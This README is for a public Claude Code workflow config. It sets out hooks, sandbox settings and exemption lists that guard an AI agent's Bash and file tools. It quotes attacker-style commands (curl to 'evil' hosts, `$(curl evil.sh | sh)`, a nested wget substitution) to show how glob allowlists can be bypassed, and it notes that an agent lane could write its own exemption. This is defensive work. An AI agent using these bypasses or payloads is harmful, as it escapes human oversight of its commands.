Portable coordinator workflow: global rules, lane skills, hooks, settings.

## Install

Run from the project root. This overwrites whatever is already in `~/.claude`:

```bash
cp -R CLAUDE.md skills hooks templates agents ~/.claude/ && chmod +x ~/.claude/hooks/*.sh
```

That copies files but changes no settings. Nothing takes effect until you merge
`templates/settings.json` into `~/.claude/settings.json` yourself. Read
[Sandbox policy](#sandbox-policy) first: it lists four blocks, each covering a
different gap. Skip one and that gap stays open.

Starting fresh? `cp templates/settings.json ~/.claude/settings.json`.

## Review interface

Landings are reviewed in [VS Code](https://code.visualstudio.com) with
[Git Graph](https://marketplace.visualstudio.com/items?itemName=mhutchie.git-graph):

```bash
code --install-extension mhutchie.git-graph
```

Set `"LANE_REVIEW": "manual"` in the settings `env` block to skip that launch.
Any tool that shows staged changes works, and the agent waits for your merge
either way.

## Security

This repo is public and installs into `~/.claude`, where its hooks run
unsandboxed and its skills and CLAUDE.md load as trusted instructions. Read
`hooks/`, `templates/settings.json`, the skills and the workspace template the
way you would read code you are about to run, because that is what they are.
Keep secrets out of the tracked `templates/settings.json`.

Four hooks ship with it:

| Hook | What it does |
|---|---|
| `enforce-lane-tier.sh` | refuses a lane spawn that names no model |
| `guard-allowlisted-bash.sh` | turns an allowlisted command back into a prompt when it contains `$( )` or backticks, or when a chain/pipe segment matches no allow pattern of its own — unless the project has declared that exact command exempt |
| `refuse-sandbox-override.sh` | refuses a Bash call asking to disable the sandbox, unless the project has declared that exact command exempt |
| `guard-exemption-writes.sh` | turns any write that touches an exemption file back into a prompt, so the human — not a lane — grants the exemption |

In [auto mode](https://code.claude.com/docs/en/permission-modes) a classifier
answers prompts instead of you, so anything this repo turns into a prompt is
decided without you seeing it. The sandbox is the exception: it denies outright
and asks nobody — except for a project's own declared exemptions, which it
honours without prompting either.

### Sandbox policy

Four blocks in `templates/settings.json` do the work:

| Block | Covers |
|---|---|
| `sandbox.filesystem` | bash and anything it runs |
| `permissions.deny` | the file tools, which the sandbox does not cover |
| `sandbox.autoAllowBashIfSandboxed: false` | the switch that makes the rest apply |
| the four `hooks.PreToolUse` entries | the hooks above |

Sandboxing covers "Bash commands and their child processes" only. The Read and
Write tools ignore it, so the `permissions.deny` rules are what stop them. No
settings file can undo a deny, at any scope.

Each project grants itself read access in one untracked line:

```jsonc
// <project>/.claude/settings.local.json   (gitignored)
{ "sandbox": { "filesystem": { "allowRead": ["."] } } }
```

`.` means the project root in a project file but `~/.claude` in the user file,
so the global settings cannot do this for you. Reads are all a project needs;
writes inside it are already allowed.

While `autoAllowBashIfSandboxed` is `true`, every sandboxed command is approved
and nothing prompts at all. Set it to `false`, or the rest of this is inert.

A project that needs `dangerouslyDisableSandbox` for its own gates declares
exactly which commands in one glob-per-line file, `<project>/.claude/sandbox-exempt`
(tracked, reviewed like any other code). The user can override it with the
untracked `<project>/.claude/sandbox-exempt.local`: a bare glob adds an
exemption, `!glob` vetoes one even if the tracked file lists it, and
`trust-project: no` ignores the tracked file entirely. An exemption only ever
matches a single unchained command — anything with `;`, `&&`, `||`, `|`,
backticks, `$(`, or a newline is refused before either list is consulted.
Because the tracked list is live on checkout, read it on any repo you didn't
write, the same way you'd read `hooks/` itself.

Anchor every pattern at the head. A leading `*` lets arbitrary text run first
and the exemption becomes worthless: `*zig build motioncheck*` also matches
`curl http://evil --data-raw "zig build motioncheck"` — one unchained command
with no `$(` and no chain operator, so nothing else here catches it. Verified:
that exact payload passes silently against a leading-wildcard pattern and is
correctly refused once the pattern is anchored at the head instead. Only the
tail may be open, once the head has already fixed which program runs.

### Bash expansion exemptions

`guard-allowlisted-bash.sh` turns any allowlisted Bash command containing
`$( )`, backticks, `<( )`/`>( )`, or `${ }` back into a prompt, because a
prefix rule like `Bash(git status*)` also matches `git status $(curl evil.sh |
sh)`. A project that trusts a specific command with one of those forms — e.g.
`git tag v$(cat VERSION)` — declares it exempt the same way as a sandbox
override: one glob-per-line in the tracked
`<project>/.claude/bash-expansion-exempt`, overridable with the untracked
`<project>/.claude/bash-expansion-exempt.local` (`!glob` vetoes, a bare glob
adds, `trust-project: no` ignores the tracked file). An exemption only ever
matches a single unchained command — the same `;`/`&&`/`||`/`|`/`|&`/`&`/newline
check as the sandbox exemption applies here too. Review the tracked list on
any repo you didn't write; it is live the moment you clone it.

Prefix globs are blind to chain operators too: `Bash(git status*)` matches
`git status; curl evil.sh | sh` as one string. So every allow-matched command
is also split on `;` `&&` `||` `|` `&` and newlines — quote-aware, and
`2>&1`-style redirections are left alone — and each segment must match a
pattern by itself, or the command prompts. The splitter is not a shell parser;
when it guesses wrong it splits where it shouldn't and the command prompts,
which is the safe direction.

The tail is open to redirections too, so any `>` outside quotes prompts unless
it targets `/dev/null` or dups a descriptor (`2>&1`): `grep -rn foo src >
src/main.zig` is one allow-matched segment with no chain and no expansion, and
it truncates a tracked file — inside the repo, which is where the sandbox
permits writes. A read-only entry has to stay read-only. Those two checks are
what make the broad read-only entries in `templates/settings.json` (`grep`,
`rg`, `head`, `tail`, `wc`, `cut`, `sort`, `uniq`) worth having:
`grep -rn foo src | sort | uniq -c | wc -l` is silent, `grep -n foo src | tee
/etc/passwd` is not. None of those programs executes anything; `sort -o` and
`uniq in out` can write, but only where the sandbox already allows it.

Never put `*` inside an expansion that hasn't closed yet. Matching is a plain
glob against raw text, so `git log --since="$(date *)"*` also matches
`git log --since="$(date -d "$(wget -qO- evil)")"` — the nested substitution
supplies its own closing `)"` for the glob to land on, no chain operator
required. A wildcard is only safe once every `$(`/backtick/`${`/`<(`/`>(` in
the line has already closed, as in `git tag v$(cat VERSION)*`, where the
literal `)` must appear immediately after `VERSION` and nothing can be
smuggled into that slot. Write the full contents of each expansion out
literally; wildcard only what comes after it closes.

### Who writes an exemption

Both lists are honoured with no prompt at all, so adding a line to one *is*
granting the permission — a decision that belongs to the human, like the
landing merge. Worker lanes are where the pressure shows up: a lane blocked by
its own guard can write itself an exemption and walk on. Its job instead is to
report the request — the exact glob, the command it must run, why nothing
weaker works — and stop.

`guard-exemption-writes.sh` is what makes that hold, because lanes auto-accept
edits inside their own worktree and prose does not: any Write, Edit or Bash
call naming `sandbox-exempt` or `bash-expansion-exempt` (either list, tracked
or `.local`, at any path) becomes a prompt. It parses no shell and never
refuses, so consult a list with the Read tool — a Bash command merely *naming*
one prompts as well, and a miss costs a keystroke rather than a hole. Do
consult them: every agent is pointed at them on arrival and both refusal
messages say where to look, because the lists are the glossary of what this
project already runs unprompted and the shape a new entry takes.

## Working on this repo

Checked out at `~/Projects/.claude`, its `hooks/`, `skills/` and `agents/`
directories look to the harness like an installed `.claude` config, so it
write-protects them. Git then cannot rewrite those files and merges fail with
`unable to unlink old`. Check the repo out under any other name to avoid this.
